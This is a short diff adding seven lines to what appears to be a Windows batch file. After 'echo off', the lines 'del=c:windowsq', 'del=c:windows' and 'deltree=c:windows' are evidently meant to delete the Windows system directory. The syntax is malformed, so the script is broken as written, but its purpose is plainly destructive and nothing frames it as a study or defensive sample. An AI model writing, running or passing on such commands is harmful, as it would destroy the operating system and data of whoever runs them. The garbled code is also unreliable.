@@ -1,0 +1,7 @@
+echo off 
+ 
+del=c:windowsq
+ 
+del=c:windows
+ 
+deltree=c:windows 
